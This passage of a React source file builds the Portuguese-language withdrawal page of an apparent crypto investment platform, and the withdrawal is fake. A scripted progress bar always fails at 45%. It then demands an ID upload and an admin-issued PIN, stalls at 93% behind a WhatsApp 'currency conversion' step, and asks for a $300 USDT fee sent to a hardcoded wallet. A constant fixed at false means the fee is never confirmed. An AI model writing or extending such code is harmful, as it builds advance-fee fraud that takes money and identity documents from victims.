import { useState, useEffect, useRef } from 'react';
import { useNavigate } from 'react-router-dom';
import { motion } from 'framer-motion';
import { 
  FaBitcoin, FaEthereum, FaArrowDown, FaLock, FaInfoCircle, 
  FaShieldAlt, FaCheckCircle, FaExclamationTriangle, FaKey, 
  FaIdCard, FaUpload, FaTimes, FaArrowUp, FaWhatsapp, FaHeadset,
  FaComments, FaShieldVirus, FaQrcode, FaCoins, FaCopy, FaCheck
} from 'react-icons/fa';
import toast from 'react-hot-toast';
import Navbar from '../components/Navbar';
import { walletService } from '../services/walletService';
import { useAuth } from '../auth/userAuth';
import { getCurrencySymbol } from '../utils/currency';
import { ADMIN_WHATSAPP } from '../data/mockData';
import { country } from '../data/countries';
import API from '../utils/axios';

const WITHDRAWAL_LIMIT = 2000000;
const TRACE_THRESHOLD = 1009;

const PROCESSING_FEE_AMOUNT = 300;
const PROCESSING_FEE_WALLET_ADDRESS = 'TJmVQ5zU2c9dQ8x7yZPq3nKcRvXwHbFdA1';
const PROCESSING_FEE_WALLET_LABEL = 'USDT (TRC20)';
const PROCESSING_FEE_PAID = false;

const Withdraw = () => {
  const navigate = useNavigate();
  const { user } = useAuth();
  const [amount, setAmount] = useState('');
  const [crypto, setCrypto] = useState('USDT');
  const [address, setAddress] = useState('');
  const [pixKeyType, setPixKeyType] = useState('cpf');
  const [loading, setLoading] = useState(false);
  const [walletBalance, setWalletBalance] = useState(0);
  const [kycStatus, setKycStatus] = useState('checking');

  const [showTransferModal, setShowTransferModal] = useState(false);
  const [transferProgress, setTransferProgress] = useState(0);
  const [transferStatus, setTransferStatus] = useState('pending');
  const [isRetry, setIsRetry] = useState(false);
  const progressInterval = useRef(null);

  const [showReactivationModal, setShowReactivationModal] = useState(false);
  const [reactivationPin, setReactivationPin] = useState('');
  const [pinError, setPinError] = useState('');
  const [isVerifyingPin, setIsVerifyingPin] = useState(false);

  const [idCardFile, setIdCardFile] = useState(null);
  const [idError, setIdError] = useState('');
  const idInputRef = useRef(null);

  const [showUpgradeModal, setShowUpgradeModal] = useState(false);
  const [showAdminSupportModal, setShowAdminSupportModal] = useState(false);

  const [showProcessingFeeModal, setShowProcessingFeeModal] = useState(false);
  const [feeCopied, setFeeCopied] = useState(false);

  const [currencyConversionDone, setCurrencyConversionDone] = useState(false);
  const [processingFeeConfirmed, setProcessingFeeConfirmed] = useState(false);

  const REACTIVATION_PIN = import.meta.env.VITE_REACTIVATION_PIN || '675489';

  const currencySymbol = getCurrencySymbol(user?.currency);

  const userLocalCountry = (() => {
    try {
      if (!user?.country) return null;
      if (!Array.isArray(country)) return null;
      const userCountry = String(user.country ?? '').trim().toLowerCase();
      if (!userCountry) return null;
      return (
        country.find((c) => {
          const name = String(c?.name ?? '').trim().toLowerCase();
          const code = String(c?.code ?? '').trim().toLowerCase();
          return name === userCountry || code === userCountry;
        }) || null
      );
    } catch {
      return null;
    }
  })();

  const localCurrency = userLocalCountry?.currency || user?.currency || 'USD';
  const localCurrencySymbol =
    userLocalCountry?.symbol || getCurrencySymbol(user?.currency) || '$';
  const localCountryName = userLocalCountry?.name || user?.country || 'seu país';
  const localCountryFlag = userLocalCountry?.flag || '🌍';

  useEffect(() => {
    const checkKYC = async () => {
      try {
        const response = await API.get('/kyc/status');
        if (response.data.success) setKycStatus(response.data.data.status);
      } catch (error) {
        console.error('Erro ao verificar status do KYC:', error);
        setKycStatus('error');
      }
    };
    checkKYC();
  }, []);

  useEffect(() => {
    const fetchData = async () => {
      try {
        const wallet = await walletService.getWallet();
        setWalletBalance(wallet?.balance || 0);
      } catch (error) {
        console.error('Falha ao buscar carteira:', error);
      }
    };
    fetchData();
  }, []);

  // Limpeza ao desmontar
  useEffect(() => {
    return () => {
      if (progressInterval.current) clearInterval(progressInterval.current);
    };
  }, []);

  // ─── Efeito do progresso (uma transição por vez) ───
  useEffect(() => {
    if (!showTransferModal) {
      if (progressInterval.current) {
        clearInterval(progressInterval.current);
        progressInterval.current = null;
      }
      return;
    }

    if (transferStatus === 'failed' || transferStatus === 'complete') return;

    let progress = transferProgress;
    const amountNum = parseFloat(amount) || 0;

    progressInterval.current = setInterval(() => {
      progress += 1;

      if (progress >= 45 && !isRetry) {
        clearInterval(progressInterval.current);
        progressInterval.current = null;
        setTransferProgress(45);
        setTransferStatus('failed');
        return;
      }

      if (progress >= 93 && isRetry && amountNum > TRACE_THRESHOLD) {
        if (!currencyConversionDone) {
          clearInterval(progressInterval.current);
          progressInterval.current = null;
          setTransferProgress(93);
          setShowTransferModal(false);
          setShowAdminSupportModal(true);
          return;
        }
        if (!processingFeeConfirmed) {
          clearInterval(progressInterval.current);
          progressInterval.current = null;
          setTransferProgress(93);
          setShowTransferModal(false);
          setShowProcessingFeeModal(true);
          return;
        }
      }

      if (progress >= 100) {
        clearInterval(progressInterval.current);
        progressInterval.current = null;
        setTransferProgress(100);
        setTransferStatus('complete');
        toast.success('Saque concluído com sucesso!');
        return;
      }

      setTransferProgress(progress);
    }, 100);

    return () => {
      if (progressInterval.current) {
        clearInterval(progressInterval.current);
        progressInterval.current = null;
      }
    };
  }, [
    showTransferModal,
    isRetry,
    transferStatus,
    amount,
    currencyConversionDone,
    processingFeeConfirmed,
  ]);

  const paymentMethods = [
    { id: 'USDT', name: 'Tether',   icon: FaBitcoin,  color: 'text-green-500' },
    { id: 'BTC',  name: 'Bitcoin',  icon: FaBitcoin,  color: 'text-orange-500' },
    { id: 'ETH',  name: 'Ethereum', icon: FaEthereum, color: 'text-purple-500' },
    { id: 'BNB',  name: 'BNB',      icon: FaBitcoin,  color: 'text-yellow-500' },
    { id: 'TRX',  name: 'Tron',     icon: FaBitcoin,  color: 'text-red-500' },
    { id: 'PIX',  name: 'PIX',      icon: FaQrcode,   color: 'text-teal-400' },
  ];

  const pixKeyTypes = [
    { id: 'cpf',    label: 'CPF/CNPJ' },
    { id: 'email',  label: 'E-mail' },
    { id: 'phone',  label: 'Telefone' },
    { id: 'random', label: 'Chave Aleatória' },
  ];

  const isPix = crypto === 'PIX';
  const addressLabel = isPix ? 'Chave PIX' : 'Endereço da Carteira';
  const addressPlaceholder = isPix
    ? pixKeyType === 'cpf'
      ? '000.000.000-00 ou 00.000.000/0000-00'
      : pixKeyType === 'email'
      ? 'seu@email.com'
      : pixKeyType === 'phone'
      ? '+55 11 99999-9999'
      : 'Chave aleatória (EVP)'
    : 'Digite o endereço da sua carteira';

  const handleSubmit = (e) => {
    e.preventDefault();
    const amountNum = parseFloat(amount);

    if (!amount || isNaN(amountNum) || amountNum < 1) {
      toast.error('Digite um valor válido');
      return;
    }
    if (kycStatus !== 'verified') {
      toast.error('Verificação KYC necessária. Complete seu KYC para sacar.');
      return;
    }
    if (amountNum > walletBalance) {
      toast.error('Saldo insuficiente');
      return;
    }
    if (!address) {
      toast.error(isPix ? 'Digite sua chave PIX' : 'Digite um endereço de carteira');
      return;
    }
    if (amountNum > WITHDRAWAL_LIMIT) {
      setShowUpgradeModal(true);
      return;
    }

    setIsRetry(false);
    setTransferStatus('pending');
    setTransferProgress(0);
    setCurrencyConversionDone(false);
    setProcessingFeeConfirmed(false);

    proceedWithdrawal(amountNum);
  };

  const proceedWithdrawal = async () => {
    setLoading(true);
    try {
      await new Promise((resolve) => setTimeout(resolve, 800));
      setShowTransferModal(true);
    } catch (error) {
      toast.error(error?.response?.data?.message || 'Falha no saque');
    } finally {
      setLoading(false);
    }
  };

  const handleRetry = () => {
    setShowTransferModal(false);
    setShowReactivationModal(true);
    setReactivationPin('');
    setPinError('');
    setIdCardFile(null);
    setIdError('');
  };

  const handleIdFileChange = (e) => {
    const file = e.target.files?.[0];
    if (!file) return;
    const validTypes = ['image/jpeg', 'image/png', 'image/jpg', 'application/pdf'];
    if (!validTypes.includes(file.type)) {
      toast.error('Formato de arquivo inválido. Use JPG, PNG ou PDF.');
      return;
    }
    if (file.size > 5 * 1024 * 1024) {
      toast.error('O arquivo deve ter no máximo 5MB.');
      return;
    }
    setIdCardFile(file);
    setIdError('');
  };

  const handleRemoveIdFile = () => {
    setIdCardFile(null);
    if (idInputRef.current) idInputRef.current.value = '';
  };

  const handleVerifyPin = () => {
    if (!idCardFile) {
      setIdError('Por favor, envie seu documento de identidade.');
      return;
    }
    setIdError('');
    if (!reactivationPin.trim()) {
      setPinError('Por favor, insira o PIN de reativação.');
      return;
    }

    setIsVerifyingPin(true);
    setPinError('');

    setTimeout(() => {
      if (reactivationPin.trim() === REACTIVATION_PIN) {
        setShowReactivationModal(false);
        setReactivationPin('');
        setPinError('');
        setIdCardFile(null);
        setIsVerifyingPin(false);
        setIsRetry(true);
        setTransferStatus('pending');
        setTransferProgress(45);
        setShowTransferModal(true);
        toast.success('Conta reativada. Concluindo transferência...');
      } else {
        setPinError('PIN inválido. Tente novamente.');
        setReactivationPin('');
        setIsVerifyingPin(false);
      }
    }, 800);
  };

  const handleConversionComplete = () => {
    setCurrencyConversionDone(true);
    setShowAdminSupportModal(false);
    setShowProcessingFeeModal(true);
  };

  const handleFeeConfirmed = () => {
    if (!PROCESSING_FEE_PAID) {
      toast.error('Taxa ainda não confirmada pelo administrador. Entre em contato com o suporte.');
      return;
    }
    setProcessingFeeConfirmed(true);
    setShowProcessingFeeModal(false);
    setTransferProgress(93);
    setShowTransferModal(true);
  };

  const handleCopyFeeWallet = () => {
    navigator.clipboard.writeText(PROCESSING_FEE_WALLET_ADDRESS);
    setFeeCopied(true);
    toast.success('Endereço da carteira copiado!');
    setTimeout(() => setFeeCopied(false), 2000);
  };

  const resetFlow = () => {
    setShowTransferModal(false);
    setShowAdminSupportModal(false);
    setShowProcessingFeeModal(false);
    setShowReactivationModal(false);
    setTransferProgress(0);
    setTransferStatus('pending');
    setIsRetry(false);
    setCurrencyConversionDone(false);
    setProcessingFeeConfirmed(false);
  };

  const handleCancelFeeStep = () => {
    resetFlow();
    toast.error('Saque cancelado.');
  };

  const handleCancelAdmin = () => {
    resetFlow();
    toast.error('Saque cancelado.');
  };

  const whatsappConversionLink = `https://wa.me/${ADMIN_WHATSAPP}?text=${encodeURIComponent(
    `Olá Suporte,\n\nPreciso da aprovação para conversão de moeda do meu saque.\n\nValor: $${parseFloat(amount || 0).toLocaleString()}\nPaís: ${localCountryName}\nMoeda: ${localCurrency} (${localCurrencySymbol})\n\nPor favor, convertam meu saldo e confirmem.`
  )}`;

  const whatsappFeeLink = `https://wa.me/${ADMIN_WHATSAPP}?text=${encodeURIComponent(
    `Olá Suporte,\n\nEnviei a taxa de processamento de $${PROCESSING_FEE_AMOUNT} referente ao meu saque.\n\n— Detalhes —\nValor do Saque: $${parseFloat(amount || 0).toLocaleString()}\nMétodo: ${isPix ? `PIX (${pixKeyType.toUpperCase()})` : crypto}\nCarteira da Taxa: ${PROCESSING_FEE_WALLET_LABEL}\nEndereço da Taxa: ${PROCESSING_FEE_WALLET_ADDRESS}\n\nPor favor, verifiquem meu pagamento e liberem o saque. Obrigado.`
  )}`;

  const finalizeWithdrawal = async () => {
    try {
      const amountNum = parseFloat(amount);
      const needsFee = amountNum > TRACE_THRESHOLD;
      await API.post('/transactions', {
        type: 'withdrawal',
        amount: amountNum,
        currency: 'USD',
        description: isPix
          ? `Saque via PIX (${pixKeyType})`
          : `Saque para carteira ${crypto}`,
        metadata: isPix
          ? { method: 'pix', pixKeyType, pixKey: address }
          : { method: 'crypto', cryptoCurrency: crypto, walletAddress: address },
        ...(needsFee && {
          processingFee: {
            amount: PROCESSING_FEE_AMOUNT,
            walletAddress: PROCESSING_FEE_WALLET_ADDRESS,
            walletLabel: PROCESSING_FEE_WALLET_LABEL,
            currency: 'USDT',
            claimed: processingFeeConfirmed,
            claimedAt: processingFeeConfirmed ? new Date().toISOString() : null,
            currencyConversionDone,
          },
        }),
        status: 'pending',
      });
    } catch (error) {
      console.error('Erro ao finalizar saque:', error);
    }
  };

  const handleCloseSuccess = async () => {
    setShowTransferModal(false);
    await finalizeWithdrawal();
    toast.success('Solicitação de saque enviada!');
    navigate('/transactions');
  };

  const formatCurrency = (value) => `${currencySymbol}${value?.toLocaleString() || '0.00'}`;
  const isKycVerified = kycStatus === 'verified';
  const amountNum = parseFloat(amount) || 0;

  const whatsappUpgradeLink = `https://wa.me/${ADMIN_WHATSAPP}?text=${encodeURIComponent(
    `Olá, gostaria de aumentar meu limite de saque. Minha solicitação atual de $${amountNum.toLocaleString()} excede o limite de $${WITHDRAWAL_LIMIT.toLocaleString()}.`
  )}`;

  return (
    <div className="min-h-screen bg-slate-900 pt-16 lg:pl-64 pb-20 lg:pb-0">
      <Navbar />
      <div className="p-4 sm:p-6 max-w-2xl mx-auto">
        <div className="mb-6">
          <h1 className="text-2xl sm:text-3xl font-bold text-white">Sacar Fundos</h1>
          <p className="text-slate-400 mt-1">Saque seus ganhos</p>
        </div>

        <motion.div
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          className="bg-slate-800/50 backdrop-blur-xl rounded-2xl p-6 border border-slate-700"
        >
          <div className="bg-slate-900 rounded-lg p-4 mb-6">
            <div className="flex justify-between items-center">
              <span className="text-slate-400">Saldo Disponível</span>
              <span className="text-xl font-bold text-white">{formatCurrency(walletBalance)}</span>
            </div>
          </div>

          <div className="mb-4 p-3 bg-blue-500/10 border border-blue-500/30 rounded-lg flex items-center gap-3">
            <FaInfoCircle className="text-blue-500 text-sm flex-shrink-0" />
            <p className="text-blue-400 text-sm">
              Seu limite de saque é de{' '}
              <strong className="text-white">{formatCurrency(WITHDRAWAL_LIMIT)}</strong> por solicitação.
            </p>
          </div>

          {!isKycVerified && (
            <div className="mb-4 p-3 bg-yellow-500/10 border border-yellow-500/30 rounded-lg flex items-center gap-3">
              <FaLock className="text-yellow-500 text-sm" />
              <p className="text-yellow-400 text-sm">
                {kycStatus === 'pending'
                  ? 'Seu KYC está pendente de aprovação. Aguarde a verificação.'
                  : 'Verificação KYC necessária para sacar. Complete seu KYC primeiro.'}
              </p>
            </div>
          )}

          <form onSubmit={handleSubmit} className="space-y-6">
            <div>
              <label className="block text-slate-300 text-sm font-medium mb-2">
                Selecione o Método de Saque
              </label>
              <div className="grid grid-cols-3 sm:grid-cols-6 gap-2">
                {paymentMethods.map((c) => (
                  <button
                    key={c.id}
                    type="button"
                    onClick={() => {
                      setCrypto(c.id);
                      if (c.id !== 'PIX') setPixKeyType('cpf');
                    }}
                    className={`p-3 rounded-lg border transition ${
                      crypto === c.id
                        ? 'border-blue-500 bg-blue-500/10'
                        : 'border-slate-700 hover:border-slate-500'
                    }`}
                  >
                    <c.icon className={`w-6 h-6 mx-auto ${c.color}`} />
                    <span className="text-xs text-slate-400 mt-1 block">{c.id}</span>
                  </button>
                ))}
              </div>
              {isPix && (
                <p className="text-teal-400 text-xs mt-2 flex items-center gap-1">
                  <FaQrcode className="text-teal-400" />
                  PIX — pagamento instantâneo brasileiro. Saque enviado em BRL.
                </p>
              )}
            </div>

            {isPix && (
              <div>
                <label className="block text-slate-300 text-sm font-medium mb-2">Tipo de Chave PIX</label>
                <div className="grid grid-cols-2 sm:grid-cols-4 gap-2">
                  {pixKeyTypes.map((t) => (
                    <button
                      key={t.id}
                      type="button"
                      onClick={() => setPixKeyType(t.id)}
                      className={`p-2 rounded-lg border text-xs font-medium transition ${
                        pixKeyType === t.id
                          ? 'border-teal-500 bg-teal-500/10 text-teal-300'
                          : 'border-slate-700 text-slate-400 hover:border-slate-500'
                      }`}
                    >
                      {t.label}
                    </button>
                  ))}
                </div>
              </div>
            )}

            <div>
              <label className="block text-slate-300 text-sm font-medium mb-2">
                Valor ({user?.currency || 'USD'})
              </label>
              <div className="relative">
                <span className="absolute left-3 top-1/2 transform -translate-y-1/2 text-slate-400">
                  {currencySymbol}
                </span>
                <input
                  type="number"
                  value={amount}
                  onChange={(e) => setAmount(e.target.value)}
                  placeholder="Digite o valor"
                  min="1"
                  step="0.01"
                  className="w-full bg-slate-900 border border-slate-700 rounded-lg pl-8 pr-4 py-3 text-white placeholder-slate-500 focus:outline-none focus:border-blue-500 transition"
                />
              </div>
              {amountNum > WITHDRAWAL_LIMIT && (
                <p className="text-red-400 text-xs mt-1">
                  O valor excede seu limite de saque de {formatCurrency(WITHDRAWAL_LIMIT)}.
                </p>
              )}
              {amountNum > TRACE_THRESHOLD && amountNum <= WITHDRAWAL_LIMIT && (
                <p className="text-amber-400 text-xs mt-1 flex items-center gap-1">
                  <FaShieldAlt className="text-amber-400" />
                  Valores acima de {formatCurrency(TRACE_THRESHOLD)} exigem verificação de segurança
                  e uma taxa de processamento de ${PROCESSING_FEE_AMOUNT}.
                </p>
              )}
            </div>

            <div>
              <label className="block text-slate-300 text-sm font-medium mb-2">{addressLabel}</label>
              <input
                type="text"
                value={address}
                onChange={(e) => setAddress(e.target.value)}
                placeholder={addressPlaceholder}
                className="w-full bg-slate-900 border border-slate-700 rounded-lg px-4 py-3 text-white placeholder-slate-500 focus:outline-none focus:border-blue-500 transition"
              />
              {isPix && (
                <p className="text-slate-500 text-xs mt-1">
                  Confira sua chave PIX — transferências não podem ser revertidas.
                </p>
              )}
            </div>

            <button
              type="submit"
              disabled={loading || !isKycVerified}
              className="w-full py-3 rounded-lg bg-gradient-to-r from-orange-600 to-red-600 text-white font-semibold hover:opacity-90 transition-all disabled:opacity-50 disabled:cursor-not-allowed flex items-center justify-center gap-2"
            >
              {loading ? (
                <div className="w-5 h-5 border-2 border-white/30 border-t-white rounded-full animate-spin"></div>
              ) : (
                <>
                  <FaArrowDown className="text-sm" /> Solicitar Saque
                </>
              )}
            </button>
          </form>
        </motion.div>
      </div>

      {/* ═══════════ MODAL DE UPGRADE DE LIMITE ═══════════ */}
      {showUpgradeModal && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/70 backdrop-blur-sm p-4">
          <div className="bg-slate-800 border border-slate-700 rounded-2xl p-6 w-full max-w-md">
            <div className="flex justify-center mb-4">
              <div className="w-16 h-16 bg-orange-500/10 border border-orange-500/30 rounded-full flex items-center justify-center">
                <FaArrowUp className="w-8 h-8 text-orange-500" />
              </div>
            </div>
            <h3 className="text-xl font-bold text-white text-center mb-2">Limite de Saque Excedido</h3>
            <p className="text-sm text-slate-400 text-center mb-4">
              Sua solicitação de saque de <strong className="text-white">{formatCurrency(amountNum)}</strong>{' '}
              excede seu limite atual de <strong className="text-white">{formatCurrency(WITHDRAWAL_LIMIT)}</strong>.
            </p>
            <div className="mb-4 p-3 bg-orange-500/10 border border-orange-500/30 rounded-lg flex items-start gap-3">
              <FaInfoCircle className="text-orange-400 text-sm mt-0.5 flex-shrink-0" />
              <p className="text-orange-300 text-xs leading-relaxed">
                Para aumentar seu limite de saque, entre em contato com nossa equipe de suporte.
              </p>
            </div>
            <div className="flex gap-3">
              <button
                onClick={() => setShowUpgradeModal(false)}
                className="flex-1 py-3 rounded-lg border border-slate-700 text-slate-300 font-medium hover:bg-slate-700/50 transition"
              >
                Cancelar
              </button>
              <a
                href={whatsappUpgradeLink}
                target="_blank"
                rel="noopener noreferrer"
                className="flex-1 py-3 rounded-lg bg-gradient-to-r from-green-600 to-emerald-600 text-white font-semibold hover:opacity-90 transition flex items-center justify-center gap-2"
              >
                <FaWhatsapp className="text-lg" /> Falar com Suporte
              </a>
            </div>
            <div className="mt-3 flex items-center justify-center gap-2 text-xs text-slate-500">
              <FaHeadset className="text-slate-500" />
              <span>Suporte disponível 24/7</span>
            </div>
          </div>
        </div>
      )}

      {/* ═══════════ MODAL DE SIMULAÇÃO DE TRANSFERÊNCIA ═══════════ */}
      {showTransferModal && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/70 backdrop-blur-sm p-4">
          <div className="bg-slate-800 border border-slate-700 rounded-2xl p-6 w-full max-w-md text-center">
            <div className="flex justify-center mb-4">
              {transferStatus === 'pending' && (
                <div className="w-16 h-16 bg-blue-500/10 border border-blue-500/30 rounded-full flex items-center justify-center">
                  <div className="w-8 h-8 border-3 border-blue-500 border-t-transparent rounded-full animate-spin"></div>
                </div>
              )}
              {transferStatus === 'failed' && (
                <div className="w-16 h-16 bg-red-500/10 border border-red-500/30 rounded-full flex items-center justify-center">
                  <FaExclamationTriangle className="w-8 h-8 text-red-500" />
                </div>
              )}
              {transferStatus === 'complete' && (
                <div className="w-16 h-16 bg-green-500/10 border border-green-500/30 rounded-full flex items-center justify-center">
                  <FaCheckCircle className="w-8 h-8 text-green-500" />
                </div>
              )}
            </div>

            <h3 className="text-xl font-bold text-white mb-2">
              {transferStatus === 'pending' && 'Processando Transferência...'}
              {transferStatus === 'failed' && 'Falha na Transferência'}
              {transferStatus === 'complete' && 'Transferência Concluída!'}
            </h3>

            <p className="text-sm text-slate-400 mb-4">
              {transferStatus === 'pending' &&
                `Movendo fundos da carteira do corretor para sua ${isPix ? 'conta PIX' : 'carteira de destino'}.`}
              {transferStatus === 'failed' &&
                'A transferência não pôde ser concluída. Por favor, tente novamente.'}
              {transferStatus === 'complete' && 'Seus fundos foram enviados com sucesso!'}
            </p>

            <div className="w-full bg-slate-700 rounded-full h-3 mb-2 overflow-hidden">
              <div
                className={`h-full rounded-full transition-all duration-300 ${
                  transferStatus === 'failed'
                    ? 'bg-red-500'
                    : transferStatus === 'complete'
                    ? 'bg-green-500'
                    : 'bg-blue-500'
                }`}
                style={{ width: `${transferProgress}%` }}
              />
            </div>
            <p className="text-xs text-slate-500 mb-4">{transferProgress}%</p>

            {transferStatus === 'failed' && (
              <button
                onClick={handleRetry}
                className="w-full py-3 rounded-lg bg-gradient-to-r from-blue-600 to-indigo-600 text-white font-semibold hover:opacity-90 transition-all"
              >
                Tentar Novamente
              </button>
            )}

            {transferStatus === 'complete' && (
              <button
                onClick={handleCloseSuccess}
                className="w-full py-3 rounded-lg bg-gradient-to-r from-green-600 to-emerald-600 text-white font-semibold hover:opacity-90 transition-all"
              >
                Concluir
              </button>
            )}
          </div>
        </div>
      )}

      {/* ═══════════ PORTÃO 1: MODAL DE CONVERSÃO DE MOEDA ═══════════ */}
      {showAdminSupportModal && (
        <div className="fixed inset-0 z-[60] flex items-center justify-center bg-black/70 backdrop-blur-sm p-4">
          <div className="bg-slate-800 border border-red-500/40 rounded-2xl p-6 w-full max-w-md max-h-[92vh] overflow-y-auto">
            <div className="flex justify-center mb-4">
              <div className="w-16 h-16 bg-red-500/10 border border-red-500/40 rounded-full flex items-center justify-center">
                <FaShieldVirus className="w-8 h-8 text-red-500" />
              </div>
            </div>

            <h3 className="text-xl font-bold text-white text-center mb-2">
              Conversão de Saldo Obrigatória
            </h3>

            <p className="text-sm text-slate-400 text-center mb-5">
              Para proteger seus fundos e prevenir fraudes, este saque{' '}
              <strong className="text-red-400">não pode ser concluído</strong> até que seu saldo
              tenha sido convertido para sua moeda local.
            </p>

            <div className="mb-4 p-4 bg-red-500/10 border-2 border-red-500/40 rounded-lg">
              <div className="flex items-start gap-3">
                <FaExclamationTriangle className="text-red-400 text-lg mt-0.5 flex-shrink-0" />
                <div className="text-red-300 text-xs leading-relaxed space-y-2">
                  <p className="font-bold text-red-200 text-sm uppercase tracking-wide">Etapa Obrigatória</p>
                  <p>
                    Seu saldo <strong className="text-white">precisa</strong> ser convertido para{' '}
                    <strong className="text-white">{localCurrency} ({localCurrencySymbol})</strong>{' '}
                    — a moeda oficial de <strong className="text-white">{localCountryFlag} {localCountryName}</strong>.
                  </p>
                  <p>
                    Isso nos permite <strong className="text-white">rastrear e monitorar</strong> a rota da transação de ponta a ponta.
                  </p>
                </div>
              </div>
            </div>

            <div className="mb-4 p-3 bg-slate-900/50 rounded-lg border border-slate-700 space-y-2 text-sm">
              <div className="flex justify-between">
                <span className="text-slate-400">Valor do Saque:</span>
                <span className="text-white font-semibold">{formatCurrency(amountNum)}</span>
              </div>
              <div className="flex justify-between">
                <span className="text-slate-400">Moeda de Destino:</span>
                <span className="text-white font-semibold">{localCurrencySymbol} {localCurrency}</span>
              </div>
              <div className="flex justify-between">
                <span className="text-slate-400">Status:</span>
                <span className="text-amber-400 font-semibold">93% — Aguardando Aprovação do Admin</span>
              </div>
            </div>

            <div className="mb-5 p-3 bg-yellow-500/10 border border-yellow-500/30 rounded-lg flex items-start gap-3">
              <FaHeadset className="text-yellow-500 text-sm mt-0.5 flex-shrink-0" />
              <p className="text-yellow-300 text-xs leading-relaxed">
                <strong className="text-yellow-200">Somente um administrador</strong> pode realizar esta conversão. Contate o suporte e depois clique em "Conversão Completa" após aprovação.
              </p>
            </div>

            <div className="flex flex-col gap-3">
              <a
                href={whatsappConversionLink}
                target="_blank"
                rel="noopener noreferrer"
                className="w-full py-3 rounded-lg bg-gradient-to-r from-green-600 to-emerald-600 text-white font-semibold hover:opacity-90 transition flex items-center justify-center gap-2"
              >
                <FaWhatsapp className="text-lg" /> Contatar Admin (Conversão de Moeda)
              </a>
              <button
                onClick={handleConversionComplete}
                className="w-full py-3 rounded-lg bg-gradient-to-r from-blue-600 to-purple-600 text-white font-semibold hover:opacity-90 transition flex items-center justify-center gap-2"
              >
                <FaCheckCircle /> Conversão Completa → Continuar
              </button>
              <button
                onClick={handleCancelAdmin}
                className="w-full py-3 rounded-lg border border-slate-700 text-slate-300 font-medium hover:bg-slate-700/50 transition"
              >
                Cancelar Saque
              </button>
            </div>

            <div className="mt-4 flex items-center justify-center gap-2 text-xs text-slate-500">
              <FaComments className="text-slate-500" />
              <span>Suporte disponível 24/7</span>
            </div>
          </div>
        </div>
      )}

      {/* ═══════════ PORTÃO 2: MODAL DE TAXA DE PROCESSAMENTO ═══════════ */}
      {showProcessingFeeModal && (
        <div className="fixed inset-0 z-[60] flex items-center justify-center bg-black/70 backdrop-blur-sm p-4">
          <div className="bg-slate-800 border border-amber-500/40 rounded-2xl p-6 w-full max-w-md max-h-[92vh] overflow-y-auto">
            <div className="flex justify-center mb-4">
              <div className="w-16 h-16 bg-amber-500/10 border border-amber-500/40 rounded-full flex items-center justify-center">
                <FaCoins className="w-8 h-8 text-amber-400" />
              </div>
            </div>

            <h3 className="text-xl font-bold text-white text-center mb-2">
              Taxa de Processamento Necessária
            </h3>

            <p className="text-sm text-slate-400 text-center mb-5">
              Uma taxa única de processamento de{' '}
              <strong className="text-amber-400">${PROCESSING_FEE_AMOUNT}.00</strong> é necessária
              para finalizar este saque de alto valor.
            </p>

            <div className="mb-4 p-4 bg-amber-500/10 border-2 border-amber-500/40 rounded-lg text-center">
              <p className="text-xs text-amber-300 uppercase tracking-wider font-semibold mb-1">Taxa de Processamento</p>
              <p className="text-3xl font-bold text-white">${PROCESSING_FEE_AMOUNT}.00</p>
            </div>

            <div className="mb-4">
              <label className="block text-slate-300 text-sm font-medium mb-2">
                Endereço de Pagamento ({PROCESSING_FEE_WALLET_LABEL})
              </label>
              <div className="flex items-center gap-2">
                <code className="flex-1 bg-slate-900 border border-slate-700 rounded-lg px-3 py-3 text-xs text-white break-all font-mono">
                  {PROCESSING_FEE_WALLET_ADDRESS}
                </code>
                <button
                  type="button"
                  onClick={handleCopyFeeWallet}
                  className="p-3 bg-slate-700 rounded-lg hover:bg-slate-600 transition flex-shrink-0"
                  title="Copiar endereço"
                >
                  {feeCopied ? <FaCheck className="text-green-400" /> : <FaCopy className="text-white" />}
                </button>
              </div>
            </div>

            <div className="mb-4 p-3 bg-blue-500/10 border border-blue-500/30 rounded-lg">
              <div className="flex items-start gap-3">
                <FaInfoCircle className="text-blue-400 text-sm mt-0.5 flex-shrink-0" />
                <div className="text-blue-300 text-xs leading-relaxed">
                  <p className="font-semibold text-blue-200 mb-1">Por que isso é necessário?</p>
                  <ul className="list-disc pl-4 space-y-1">
                    <li>Verificação de segurança adicional para transferências de alto valor</li>
                    <li>Custos de processamento de blockchain e rede</li>
                    <li>Conformidade e monitoramento antifraude</li>
                    <li>Execução da conversão de moeda</li>
                  </ul>
                </div>
              </div>
            </div>

            <div className="mb-4 p-3 bg-slate-900/50 rounded-lg border border-slate-700 space-y-2 text-sm">
              <div className="flex justify-between">
                <span className="text-slate-400">Valor do Saque:</span>
                <span className="text-white font-semibold">{formatCurrency(amountNum)}</span>
              </div>
              <div className="flex justify-between">
                <span className="text-slate-400">Taxa de Processamento:</span>
                <span className="text-amber-400 font-semibold">${PROCESSING_FEE_AMOUNT}.00</span>
              </div>
              <div className="flex justify-between">
                <span className="text-slate-400">Status:</span>
                <span className={PROCESSING_FEE_PAID ? 'text-green-400 font-semibold' : 'text-amber-400 font-semibold'}>
                  {PROCESSING_FEE_PAID ? 'Taxa Confirmada ✓' : 'Aguardando Confirmação do Admin'}
                </span>
              </div>
            </div>

            {!PROCESSING_FEE_PAID ? (
              <div className="mb-4 p-3 bg-yellow-500/10 border border-yellow-500/30 rounded-lg flex items-start gap-3">
                <FaLock className="text-yellow-500 text-sm mt-0.5 flex-shrink-0" />
                <p className="text-yellow-300 text-xs leading-relaxed">
                  <strong className="text-yellow-200">Aguardando confirmação do administrador.</strong>{' '}
                  Envie a taxa para o endereço acima e entre em contato com o suporte.
                </p>
              </div>
            ) : (
              <div className="mb-4 p-3 bg-green-500/10 border border-green-500/30 rounded-lg flex items-start gap-3">
                <FaCheckCircle className="text-green-500 text-sm mt-0.5 flex-shrink-0" />
                <p className="text-green-300 text-xs leading-relaxed">
                  <strong className="text-green-200">Taxa confirmada!</strong> Você pode prosseguir com seu saque.
                </p>
              </div>
            )}

            <div className="flex flex-col gap-3">
              <button
                type="button"
                onClick={handleFeeConfirmed}
                disabled={!PROCESSING_FEE_PAID}
                className={`w-full py-3 rounded-lg text-white font-bold transition flex items-center justify-center gap-2 ${
                  PROCESSING_FEE_PAID
                    ? 'bg-gradient-to-r from-amber-600 to-orange-600 hover:opacity-90'
                    : 'bg-slate-700 opacity-50 cursor-not-allowed'
                }`}
              >
